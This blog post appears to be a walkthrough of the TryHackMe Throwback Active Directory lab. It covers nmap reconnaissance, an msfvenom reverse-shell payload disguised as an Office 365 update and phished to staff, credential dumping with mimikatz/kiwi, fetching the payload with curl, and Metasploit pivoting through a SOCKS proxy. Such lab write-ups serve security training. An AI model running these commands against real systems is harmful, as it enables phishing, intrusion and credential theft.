---
title: "Pivoting through the Throwback Active Directory network"
date: 2021-03-11
---


The Throwback network on [Tryhackme](https://tryhackme.com/room/throwback) simulate a realistic corporate Active Directory environment. In this scenario, you are part of a red team that is tasked to do a network penetration testing. Since this network is segmented I will be able to show you how to pivot from the DMZ to the first domain.

## The lay of the land

At first you only see some of the machine and they are added to the network diagram as you discovered them. I'll show you what the entirely discovered network looks like:

![Throwback network diagram](/github-pages-with-jekyll/assets/images/tb-network-diagram.png)\
Figure 1: The Throwback network diagram

So let's begin by running nmap:

````
nmap -sV -sC -p- -vv 10.200.19.0/24 --min-rate 5000 -oN firstScan
````

If you are not familiar with nmap, I would recommand that you keep using those flags until you know better.

If you don't want to read the output I've made a recap:

- A pfsense firewall running on 10.200.19.138 that's also hosting a website. Might be worth investigating...
- A linux box on 10.200.19.177 that is listening on port 1337 (the elite port) which seems to be hosting a website but since it’s not on the tryhackme network diagram I considered it was out of scope.
- A windows machine on 10.200.19.219 that is hosting the company website, some smb services, remote desktop connection and more. Apparently it’s also disclosing a domain name: throwback.local.
- A linux box on 10.200.19.232 that's hosting a PHP Squirrel mail server.

<details>
    <summary> Click if you want a more detailed look </summary>

    Nmap scan report for 10.200.19.138
    Host is up, received syn-ack (0.11s latency).
    Scanned at 2021-03-11 18:57:58 EST for 359s
    Not shown: 65531 filtered ports
    Reason: 65531 no-responses
    PORT    STATE SERVICE  REASON  VERSION
    22/tcp  open  ssh      syn-ack OpenSSH 7.5 (protocol 2.0)
    | ssh-hostkey: 
    |   4096 38:04:a0:a1:d0:e6:ab:d9:7d:c0:da:f3:66:bf:77:15 (RSA)
    |_ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQDN6yAJkDf3ePS4Etb1KKfEe6Az22BPADTvyCijKGexA0/xVVqwbhlLdXRf8lsGIyxOrEA/VZx7yq+iYL+tW8fnItuLaco6YTDJbtK8V0FQCFTyfCINNKH/jYABwG1i6TkZnaneAXKby8snChez7+r1Bz1fPzxne4PTrvBazH58jHV5A3y+xgskcZct8LnGnaib4LoAtXgd+t1sVjv+BHbpevCbSHNxhqb4S/Vsja2XTr37U1SXnst6xRTqRHal1ziq08Ijzxm17I5bUY6wRZRv01IZCWdE9JHaoVbkHtMOPMAsOsg99fXnb8I++jruuFWJbNQ26/1rwMqeaIslpAsKsFijCe5IbXwvKuzI6A9sM0IYObV+CevgYraQ7G4zx+WeBUIqu8dOt16n4suz33kaI17jbBdfSR6GxdT3ysqEsSkLd6p0HIR0JxIk5t7qGhG9KSvfsk42JUMyoocbK3tO8O/xInXPSuBWiohcGz0aJckVIOJuQSm8dkGRj62yOfzSyh9utWWu8Zi/dngRR6qOCMz538aQ/DReNEgqXl0Zn2roj42scFhidj4VgO0vhClotAmOZrFhu3wXc91ImkTdvApK7XcAQ4NGIt8kf0TylvHkV8T39zOB2uoFgITShRqHUQ6AnxwivFkdbdALT2IWh3CJRVD4Vwwog5L4ohsDjw==
    53/tcp  open  domain   syn-ack (generic dns response: REFUSED)
    80/tcp  open  http     syn-ack nginx
    | http-methods: 
    |_  Supported Methods: GET HEAD POST OPTIONS
    |_http-title: Did not follow redirect to https://10.200.19.138/
    443/tcp open  ssl/http syn-ack nginx
    |_http-favicon: Unknown favicon MD5: 5567E9CE23E5549E0FCD7195F3882816
    | http-methods: 
    |_  Supported Methods: GET HEAD POST
    |_http-title: pfSense - Login
    1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
    SF-Port53-TCP:V=7.91%I=7%D=3/11%Time=604AAEE9%P=x86_64-pc-linux-gnu%r(DNSV
    SF:ersionBindReqTCP,E,"\0\x0c\0\x06\x81\x05\0\0\0\0\0\0\0\0");

    Nmap scan report for 10.200.19.177
    Host is up, received conn-refused (0.11s latency).
    Scanned at 2021-03-11 18:57:58 EST for 359s
    Not shown: 64796 closed ports, 737 filtered ports
    Reason: 64796 conn-refused and 737 no-responses
    PORT     STATE SERVICE REASON  VERSION
    22/tcp   open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
    | ssh-hostkey: 
    |   2048 8c:f6:18:d8:5e:e6:6a:a9:28:4d:82:ba:0c:4b:a6:08 (RSA)
    | ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCiaeZZSK+Kl9D6iVD4io7hGe7DQSPPrfCFMuosW7Os2P+wUTT88EtSS0himiAw4c+r//8ST6ZlKo3xlAs8epcGdCXc2FI16QelTcAhV2eUUv4UexxpXluJudUf9fCt2iA/oNx7SCm2P9UAjzQ1uz3xmzq8U+Lvrdb8pzHW5U0siOwsqIw2FfjBMNjxl2jPMJGncrPSqVZfopd/9XSYshiu4ogt5wBI7nf/MqFkcVAujeBeujyBJAHuUv6Uk7+0AeEYBex866zlwAYIk8WGduYH03oqKP+n2oGynTBiBdzELZSIFi5dSbuojdwhFgdggLWk46xRvjr9g8/8Bm7AhF+d
    |   256 d0:89:50:9e:8f:4e:69:25:ce:d9:5f:55:c8:9e:6e:61 (ECDSA)
    | ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBLD4YjMWchPYDiylhQfBHzVVine1neUmL5xGpcx+rdKeJi17gbnP8jnTCxIs33c/EJ3Xpbm2q+phiWY8Az0Aags=
    |   256 3e:cf:3b:a0:f5:f2:25:d6:a2:d8:58:79:af:85:f4:b0 (ED25519)
    |_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAILswjCDpytvkSxAYlXsjM1AlCdlAusoTWLzbJKWa91pl
    1337/tcp open  http    syn-ack Node.js Express framework
    | http-methods: 
    |_  Supported Methods: GET HEAD POST OPTIONS
    |_http-title: Error
    Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

    Nmap scan report for 10.200.19.219
    Host is up, received syn-ack (0.11s latency).
    Scanned at 2021-03-11 18:57:58 EST for 359s
    Not shown: 65524 filtered ports
    Reason: 65524 no-responses
    PORT      STATE SERVICE       REASON  VERSION
    22/tcp    open  ssh           syn-ack OpenSSH for_Windows_7.7 (protocol 2.0)
    | ssh-hostkey: 
    |   2048 85:b8:1f:80:46:3d:91:0f:8c:f2:f2:3f:5c:87:67:72 (RSA)
    | ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCnKjeLuGU2zxdCn6Sp+VdhgCN7iZFY04nx9G/O3bO2DXiahD7QIjXecH1/wvU/E8KjjJ6WtC1Brcy6N7y3y+JgWJXMP16zdcpvN5MojHEWqhynwsgyeH72tkb2yA1w/BPdAXLM/WJPg7A+ijb9K+O9E7gki1AaTClOnus2SjoVDnfBct9H3vcXjyOxHDsET/IJhf0h5dzA/aU+haHi/eCLCgs/rg+Nvy3fUG9gjwX1rmvp0cNfc9EPF3VLDZXHvxpp0yZZ/+PYICED3wwZvJgtMea7QugGlVYC/2kPwbmye9Jv3flntlY5oocKDL0b0NsQyWLKksdtYHy65VmVS6Ct
    |   256 5c:0d:46:e9:42:d4:4d:a0:36:d6:19:e5:f3:ce:49:06 (ECDSA)
    | ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBEDoOfGWQuloN4GyUbPxCdLJOFotYm8sm0n7/1zXvnMgce5kGr96+NltWlA8sI5ft8wKwbc1alfhFi290bL9TSY=
    |   256 e2:2a:cb:39:85:0f:73:06:a9:23:9d:bf:be:f7:50:0c (ED25519)
    |_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIIXGLApUD1SJY4lBgAv6SHPtSBL9r4WWNdiZlNFSZulT
    80/tcp    open  http          syn-ack Microsoft IIS httpd 10.0
    | http-methods: 
    |   Supported Methods: OPTIONS TRACE GET HEAD POST
    |_  Potentially risky methods: TRACE
    |_http-server-header: Microsoft-IIS/10.0
    |_http-title: Throwback Hacks
    135/tcp   open  msrpc         syn-ack Microsoft Windows RPC
    139/tcp   open  netbios-ssn   syn-ack Microsoft Windows netbios-ssn
    445/tcp   open  microsoft-ds? syn-ack
    3389/tcp  open  ms-wbt-server syn-ack Microsoft Terminal Services
    | rdp-ntlm-info: 
    |   Target_Name: THROWBACK
    |   NetBIOS_Domain_Name: THROWBACK
    |   NetBIOS_Computer_Name: THROWBACK-PROD
    |   DNS_Domain_Name: THROWBACK.local
    |   DNS_Computer_Name: THROWBACK-PROD.THROWBACK.local
    |   DNS_Tree_Name: THROWBACK.local
    |   Product_Version: 10.0.17763
    |_  System_Time: 2021-03-12T00:00:22+00:00
    | ssl-cert: Subject: commonName=THROWBACK-PROD.THROWBACK.local
    | Issuer: commonName=THROWBACK-PROD.THROWBACK.local
    | Public Key type: rsa
    | Public Key bits: 2048
    | Signature Algorithm: sha256WithRSAEncryption
    | Not valid before: 2021-03-08T18:13:30
    | Not valid after:  2021-09-07T18:13:30
    | MD5:   8df7 8fa5 ae0f 9763 6f44 df6e 3df9 b041
    | SHA-1: 22ea 768d 87d2 8b77 c387 ae88 5f17 6b86 3dfd 615e
    | -----BEGIN CERTIFICATE-----
    | MIIDADCCAeigAwIBAgIQaHcYhu5BdI5GYPkb9eQUjzANBgkqhkiG9w0BAQsFADAp
    | MScwJQYDVQQDEx5USFJPV0JBQ0stUFJPRC5USFJPV0JBQ0subG9jYWwwHhcNMjEw
    | MzA4MTgxMzMwWhcNMjEwOTA3MTgxMzMwWjApMScwJQYDVQQDEx5USFJPV0JBQ0st
    | UFJPRC5USFJPV0JBQ0subG9jYWwwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEK
    | AoIBAQDbQGKvDiH4bJ17Eg9eoMXidEQDAfxfdjsjUK1OvlWygIYHq9w9ywt+LQNb
    | 5uVV9ILBci6aSseE0KOFtRO3iQBqy+XC0YZNQwPxOnRd08e7cOyEuXvZw03p3AUW
    | QXDsI/PgMLPjgth1FXl27DWf/esaA2DbYso5/w6II72gHlv3Qm404eowt/kkb+nK
    | Z1zhtEyLM5y1kWwqEx6AO7IGztdgnO/9nH7TpzpfsVQ1vHKlg+ArLZz+anvlxVCX
    | jOxcFGaG98/qJTB/DwHbP25i6q1osf4WCuYTlWCxaIFjsVdg9M656pEOBkGZYgSZ
    | VBR63LY+eLpQgItvUdCfngz43CEFAgMBAAGjJDAiMBMGA1UdJQQMMAoGCCsGAQUF
    | BwMBMAsGA1UdDwQEAwIEMDANBgkqhkiG9w0BAQsFAAOCAQEAY/mQpcHIFrGTTQ15
    | 7e2erOWv4Rh/bNOTIF1UubPS4V0bDaeqY6GJnLez4I/9YZRXjJMKdCOT0SQsgEPy
    | evdgSITtNM+p0kYUi22GOlW6l5xckA+8qMXa+IYpIT4zGJvVahOcZ641arbh4Ldx
    | aO74/Ym9mrBtW03/OEbcg7Dl0X0nbya3Veepdt3T5gcbRHytsFq6Z5pGycifzoZS
    | tn1Ba4O5dBOdc7Tu4jhhLmDQkKGTAKDn6Ay/CFALA2s8m6LfN0DxxLD7QfIhveVl
    | kEF0pKD6+BK8By/W1zwFsprgxVpGKmLM7m5ogrMIVFOCQ4utznW6kUmkpiDU1kro
    | lrYnPg==
    |_-----END CERTIFICATE-----
    |_ssl-date: 2021-03-12T00:01:55+00:00; -1s from scanner time.
    5357/tcp  open  http          syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
    |_http-server-header: Microsoft-HTTPAPI/2.0
    |_http-title: Service Unavailable
    5985/tcp  open  http          syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
    |_http-server-header: Microsoft-HTTPAPI/2.0
    |_http-title: Not Found
    49668/tcp open  msrpc         syn-ack Microsoft Windows RPC
    49669/tcp open  msrpc         syn-ack Microsoft Windows RPC
    49679/tcp open  msrpc         syn-ack Microsoft Windows RPC
    Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

    Host script results:
    |_clock-skew: mean: 0s, deviation: 0s, median: -1s
    | p2p-conficker: 
    |   Checking for Conficker.C or higher...
    |   Check 1 (port 36574/tcp): CLEAN (Timeout)
    |   Check 2 (port 17256/tcp): CLEAN (Timeout)
    |   Check 3 (port 45719/udp): CLEAN (Timeout)
    |   Check 4 (port 44843/udp): CLEAN (Timeout)
    |_  0/4 checks are positive: Host is CLEAN or ports are blocked
    | smb2-security-mode: 
    |   2.02: 
    |_    Message signing enabled but not required
    | smb2-time: 
    |   date: 2021-03-12T00:00:25
    |_  start_date: N/A

    Nmap scan report for 10.200.19.232
    Host is up, received syn-ack (0.11s latency).
    Scanned at 2021-03-11 18:57:58 EST for 359s
    Not shown: 64782 closed ports, 749 filtered ports
    Reason: 64782 conn-refused and 749 no-responses
    PORT    STATE SERVICE  REASON  VERSION
    22/tcp  open  ssh      syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
    | ssh-hostkey: 
    |   2048 6e:d7:da:a2:d1:8e:05:cc:0f:97:0e:98:e4:46:13:52 (RSA)
    | ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDQrh1WDImXWkUIkulU4154PW76Nwl+Vmtq6C5OSb/vMU9DkZfTTq19GREGscjJFOIYtSKID42xQbhCEUw+QG6BZVMp91u/nhYUAxn90Lav/9NC88Rgw+dBmCYkbEnSffaRSNB+3JXmpCvVufUsx39pK7XloLHrEhOHel7FztG42cdo/JUSsDAGO3UAif0LU3/kzuholuBI8HOiMYe837iqn2FgqdKKvTGtCvUO/1pvqpoqQsiWv0hG2Ryab3zA5ZuDL+WXx0STTxFXc67wdJuKda9XxoPetE41PutyO1q8h4MoaaPkex2oPOba/DZSkTX3FxZzPu56Z9JEowr/tUbD
    |   256 ab:9a:00:f9:7e:e4:1f:bf:06:18:31:a2:74:ea:9e:f5 (ECDSA)
    | ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBMAZ77Sz6Z6/mY9BETsESTAnLjvPuDXAohSLWl52wKQsVgs2stdQewfuHrLAow2MwrDkdfrxNXgR4ilChjpwZZU=
    |   256 ce:f4:dc:f3:34:8c:60:fe:36:77:c1:23:a6:39:ad:d4 (ED25519)
    |_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKOtTbRNwAGQY4bbG6TAmjYBuhr6rXUtH3xULmWFqQ9b
    80/tcp  open  http     syn-ack Apache httpd 2.4.29 ((Ubuntu))
    |_http-favicon: Unknown favicon MD5: 2D267521ED544C817FADA219E66C0CCC
    | http-methods: 
    |_  Supported Methods: GET HEAD POST OPTIONS
    |_http-server-header: Apache/2.4.29 (Ubuntu)
    | http-title: Throwback Hacks - Login
    |_Requested resource was src/login.php
    143/tcp open  imap     syn-ack Dovecot imapd (Ubuntu)
    |_imap-capabilities: more have post-login listed LOGIN-REFERRALS capabilities ID OK LOGINDISABLEDA0001 IMAP4rev1 ENABLE Pre-login STARTTLS LITERAL+ SASL-IR IDLE
    | ssl-cert: Subject: commonName=ip-10-40-119-232.eu-west-1.compute.internal
    | Subject Alternative Name: DNS:ip-10-40-119-232.eu-west-1.compute.internal
    | Issuer: commonName=ip-10-40-119-232.eu-west-1.compute.internal
    | Public Key type: rsa
    | Public Key bits: 2048
    | Signature Algorithm: sha256WithRSAEncryption
    | Not valid before: 2020-07-25T15:51:57
    | Not valid after:  2030-07-23T15:51:57
    | MD5:   adc4 c6e2 d74f d9eb ccde 96aa 5780 bb69
    | SHA-1: 93aa 5da0 3829 8ca3 aa6b f148 4f92 1ed0 c568 a942
    | -----BEGIN CERTIFICATE-----
    | MIIDPzCCAiegAwIBAgIUBi8QQ3aoaNnMf9AmYXrcOAcmLY8wDQYJKoZIhvcNAQEL
    | BQAwNjE0MDIGA1UEAwwraXAtMTAtNDAtMTE5LTIzMi5ldS13ZXN0LTEuY29tcHV0
    | ZS5pbnRlcm5hbDAeFw0yMDA3MjUxNTUxNTdaFw0zMDA3MjMxNTUxNTdaMDYxNDAy
    | BgNVBAMMK2lwLTEwLTQwLTExOS0yMzIuZXUtd2VzdC0xLmNvbXB1dGUuaW50ZXJu
    | YWwwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQCaCuvWUp5MpNwjeX2z
    | IS0Nb6siOqetX9U3naF2/NLdshSs508HySiDPQSja0gk0EaGWRvtG+FY9pC94WPn
    | mUujYyydImFVpuE8SrfYrEmwWVvsOhDIQss+zw3rj3TRfb59LOkkixlKjz/oJV38
    | 7px1VnqdyRaZ58/iA1NnivQPlo8YVtMwpbg3NgDgbTEj+mMoVTZrSDVAgrpgFxzm
    | iwN2Oov4nbJ7oCXvoC8uo9nnqf0tk82ole4KNE41eNndepdiEJqo2tkC3zVKYAkV
    | zUK0TJyW3mwUAjidxWxBSbqs6UgMq/Ez4WQVHaRIDP7Fq2LXq5bPnydN53xZpyls
    | qCMpAgMBAAGjRTBDMAkGA1UdEwQCMAAwNgYDVR0RBC8wLYIraXAtMTAtNDAtMTE5
    | LTIzMi5ldS13ZXN0LTEuY29tcHV0ZS5pbnRlcm5hbDANBgkqhkiG9w0BAQsFAAOC
    | AQEAmSNKnQzOTCb7ihY5VmfANUWqU1C8Zk6G3AIxkUuwPUUaRENtrK1WH0oPFOv2
    | Ck9puvrSmFHUXJrGDkv7Mf8VjeZEPRgJ56cK4RG7HftBRQ5iWVgKFmzJVCPmTuUl
    | a05Wx+Nk47CrTrNvCOYaC4/M1xqkOHPLRVclYHy0/Vp94kw7LNc3KsENiWEWWq2D
    | /IzdXGsX0rlWiOd4d/zHeTlIbBZiHXvq9hRDZmNUC2rVwEdv025zrLJyl/32KXR+
    | OjoZWbvvjglixBZ5GH3Y1NVKTnDtESMk41a3RBDf5ulbr7g478Y3jRaFY+qm1b9b
    | 2mP+0tBehCl8b6u+ipq4CJkTuw==
    |_-----END CERTIFICATE-----
    |_ssl-date: TLS randomness does not represent time
    993/tcp open  ssl/imap syn-ack Dovecot imapd (Ubuntu)
    |_imap-capabilities: more AUTH=PLAINA0001 have LOGIN-REFERRALS post-login ID OK listed IMAP4rev1 ENABLE capabilities Pre-login LITERAL+ SASL-IR IDLE
    | ssl-cert: Subject: commonName=ip-10-40-119-232.eu-west-1.compute.internal
    | Subject Alternative Name: DNS:ip-10-40-119-232.eu-west-1.compute.internal
    | Issuer: commonName=ip-10-40-119-232.eu-west-1.compute.internal
    | Public Key type: rsa
    | Public Key bits: 2048
    | Signature Algorithm: sha256WithRSAEncryption
    | Not valid before: 2020-07-25T15:51:57
    | Not valid after:  2030-07-23T15:51:57
    | MD5:   adc4 c6e2 d74f d9eb ccde 96aa 5780 bb69
    | SHA-1: 93aa 5da0 3829 8ca3 aa6b f148 4f92 1ed0 c568 a942
    | -----BEGIN CERTIFICATE-----
    | MIIDPzCCAiegAwIBAgIUBi8QQ3aoaNnMf9AmYXrcOAcmLY8wDQYJKoZIhvcNAQEL
    | BQAwNjE0MDIGA1UEAwwraXAtMTAtNDAtMTE5LTIzMi5ldS13ZXN0LTEuY29tcHV0
    | ZS5pbnRlcm5hbDAeFw0yMDA3MjUxNTUxNTdaFw0zMDA3MjMxNTUxNTdaMDYxNDAy
    | BgNVBAMMK2lwLTEwLTQwLTExOS0yMzIuZXUtd2VzdC0xLmNvbXB1dGUuaW50ZXJu
    | YWwwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQCaCuvWUp5MpNwjeX2z
    | IS0Nb6siOqetX9U3naF2/NLdshSs508HySiDPQSja0gk0EaGWRvtG+FY9pC94WPn
    | mUujYyydImFVpuE8SrfYrEmwWVvsOhDIQss+zw3rj3TRfb59LOkkixlKjz/oJV38
    | 7px1VnqdyRaZ58/iA1NnivQPlo8YVtMwpbg3NgDgbTEj+mMoVTZrSDVAgrpgFxzm
    | iwN2Oov4nbJ7oCXvoC8uo9nnqf0tk82ole4KNE41eNndepdiEJqo2tkC3zVKYAkV
    | zUK0TJyW3mwUAjidxWxBSbqs6UgMq/Ez4WQVHaRIDP7Fq2LXq5bPnydN53xZpyls
    | qCMpAgMBAAGjRTBDMAkGA1UdEwQCMAAwNgYDVR0RBC8wLYIraXAtMTAtNDAtMTE5
    | LTIzMi5ldS13ZXN0LTEuY29tcHV0ZS5pbnRlcm5hbDANBgkqhkiG9w0BAQsFAAOC
    | AQEAmSNKnQzOTCb7ihY5VmfANUWqU1C8Zk6G3AIxkUuwPUUaRENtrK1WH0oPFOv2
    | Ck9puvrSmFHUXJrGDkv7Mf8VjeZEPRgJ56cK4RG7HftBRQ5iWVgKFmzJVCPmTuUl
    | a05Wx+Nk47CrTrNvCOYaC4/M1xqkOHPLRVclYHy0/Vp94kw7LNc3KsENiWEWWq2D
    | /IzdXGsX0rlWiOd4d/zHeTlIbBZiHXvq9hRDZmNUC2rVwEdv025zrLJyl/32KXR+
    | OjoZWbvvjglixBZ5GH3Y1NVKTnDtESMk41a3RBDf5ulbr7g478Y3jRaFY+qm1b9b
    | 2mP+0tBehCl8b6u+ipq4CJkTuw==
    |_-----END CERTIFICATE-----
    |_ssl-date: TLS randomness does not represent time
    Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

</details>
<br>

Next let's take a look at the company website. There is some employees photos and job title, always fun to see who's behind the username we will encounter. There is also email contacts that could be useful but we will getting a lot more of them in the next section. At the bottom of the site there is link to Linkedin and Twitter account which we could visit eventually.

![Throwback hacks website](/github-pages-with-jekyll/assets/images/tb-hacks-website.png)\
Figure 2: Throwback Hacks website\

Before we go any further I'll show you a slightly different network diagram notice that will help me illustrate the path I took through the network. On the diagram you can see my laptop which has VPN connection to the network, I’ll use the IP that correspond to tun0 (you can see that IP using ifconfig). The network I'm in is 10.200.19.0/24 but yours maybe different i.e. 10.200.x.0/24.

![Throwback hacks website](/github-pages-with-jekyll/assets/images/tb-network-diagram2.png)\
Figure 3: Network diagram from my perspective\

There is multiple path to reach the Throwback domain but I will use an easy and fast way: the phishing campaign.

## Gone phishing

Before we login to the mail server and start sending phishing email, we got a little preparation to make. We will craft the malicious executable, aka payload, that we will send to our potential victims by using this command:

````
msfvenom -p windows/meterpreter/reverse_tcp LHOST=tun0 LPORT=53 -f exe -o Office365Update.exe    
````

Don't mind the name yet, it will make sense soon enough. Now start Metasploit and set up an handler:

````
sudo msfconsole
> use exploit/multi/handler
> getuid
````

You can type _options_ to see parameters used by the current module and _set_ to modify them. There is also the command save that remembers what parameters you set so you won't have to set them everytime. So it should look like this:

````
> options
Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     tun0             yes       The listen address (an interface may be specified)
   LPORT     53               yes       The listen port
````

To start the handler in the background: _exploit -j_

Now let’s take a look the Throwback-MAIL box website.

![Throwback hacks website](/github-pages-with-jekyll/assets/images/tb-mail.png)\
Figure 4: Throwback mail website

Conveniently, there is a guest account. Log in and you'll see that you have access to the address book. Send everyone an email, urging them to execute your payload:

  ![Throwback hacks website](/github-pages-with-jekyll/assets/images/phishing-email.png)\
Figure 4: A suspicious mail from IT

## All the cool kids love Metasploit (and mimikatz)

In less then a minute I received a meterpreter shell. Let see what kind of session we are in using the following commands:

````
meterpreter> getuid                      
Server username: THROWBACK-WS01\BlaireJ    
meterpreter > sysinfo                                                                              
Computer: THROWBACK-WS01                                                                   
OS              : Windows 10 (10.0 Build 19041).                                                   
Architecture    : x64                                                                              
System Language : en_US                                                                            
Domain          : THROWBACK                                                                        
Logged On Users : 8                                                                                
Meterpreter     : x86/windows  
````

So I’m logged in as BlaireJ on the THROWBACK-WS01 box inside the THROWBACK domain. The only problem is that my meterpreter session is using the x86 computer architecture altough the machine is using x64. No worries I will list process and choose one that has the right architecture and that has NT AUTHORITY\SYSTEM permission, which is the highest available on a windows machine. I will then migrate my session into that process. This one looks fitting:

````
meterpreter > ps
…
2112  768   svchost.exe                   x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
…
meterpreter > migrate 2112
````

So I checked out _sysinfo_ again and I’m now in a x64 meterpreter shell and _getuid_ indicate that I’m now running as system. So I’m gonna load kiwi (previously known as mimikatz) and try to dump some credentials. If you never heard about mimikatz, it’s a very useful post exploitation tools that allows, among other things, to gather credentials on a windows machine:
````
meterpreter > load kiwi
meterpreter > help kiwi
````

I tried a couple of kiwi commands and I tought I was in a dead end until I tried:

````
meterpreter > lsa_dump_secret:
…
Secret  : DefaultPassword
old/text: ******** (here you should see the password but tryhackme doesn't allows showing password in writeups)
````

It seems that Windows keep password of the user in DefaultPassword registry in some cases, like if remote desktop autologon is enabled. It is only accessible via SYSTEM permission but we got that when we migrated process. I have some Microsoft reference and that section also applies to Windows 10:
[Microsoft Cached and Stored Credentials Overview: LSA](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/hh994565(v=ws.11)#lsass-process-memory)

 So I managed to get a domain user password which I will use to set up my foothold on the Throwback-Prod machine. So in the last sections we will set up the proxychains which will allow us to run command from our laptop as if we were launching them from Throwback-Prod.

## Setting up the chains

To set up the proxy, we need a meterpreter session. So back in metasploit, launch the handler again. We will use the payload we crafted earlier, after all we want everyone to benefits from our "update". In the folder you have the payload, we will serve the file with a python server:

````
python3 -m http.server
````

Then ssh into Throwback-PROD since we now have his password:

````
ssh blairej@10.200.19.219
````

Use curl to grab the payload and execute it to get a meterpreter session (remember the ip is the same as tun0 so it will be different for you)

````
curl 10.50.17.38:8000/Office365Update.exe --output Office365Update.exe
````

When setting the autoroute make sure to set the session that is on Throwback-PROD (not WS01).

````
msf6 exploit(multi/handler) > use post/multi/manage/autoroute
msf6 exploit(multi/handler) > options
   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   CMD      autoadd          yes       Specify the autoroute command (Accepted: add, autoadd, print, delete, default)
   NETMASK  255.255.255.0    no        Netmask (IPv4 as "255.255.255.0" or CIDR as "/24"
   SESSION  3                yes       The session to run this module on.
   SUBNET   10.200.19.0      no        Subnet (IPv4, for example, 10.10.10.0)
````

Then set up the proxy (I had to set version to 4a):

````
msf6 auxiliary(server/socks_proxy) > use auxiliary/server/socks_proxy 
msf6 auxiliary(server/socks_proxy) > options

Module options (auxiliary/server/socks_proxy):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SRVHOST  0.0.0.0          yes       The address to listen on
   SRVPORT  1080             yes       The port to listen on
   VERSION  4a               yes       The SOCKS version to use (Accepted: 4a, 5)

````

Modify your proxychains configuration file like this by commenting the last line and adding the line corresponding to the 1080 port:

````
sudo nano /etc/proxychains4.conf
...
#socks4         127.0.0.1 9050
socks4 127.0.0.1 1080
````

You can now run commands on the throwback domain by preceding your commands by proxychains. There was a lot of time when I wanted to verify if my proxychains were working, I would then use that command:

````
proxychains nmap -Pn -sT -p22 10.200.19.222
````

If the port is open then your proxychains is working and you are now in the Throwback domain!

## Conclusion

This post was only a brief introduction to the Throwback network. If you hack the other boxes in the DMZ you will see a lot of fun stuff: default credentials, remote code execution, LLMNR poisoning, password spraying with hydra and so on.

 The hardest part for me was pivoting around the network and it's not over yet, rembember you still have to access the corporate domain. There is plenty of fun stuff you still have see: bloodhound, kerberoasting, OSINT and even crafting an excel file with a malicious macro inside.

 Finally, I'll just give you a quick hint if you have difficulty entering the last domain. I had difficulty setting up my proxychains for it and my ssh connection were refused. So I used the previous proxychains with xfreedrdp to connect to Throwback-DC01 and then I used Windows Remote Desktop to connect to Corporate DC01. Might not be elegant but it worked! :joy_cat:

 I still have lots to learn about network pentesting and pivoting and I'dlike to have another go with this network once I have more experience. Have a good one and help making the internet a safer place!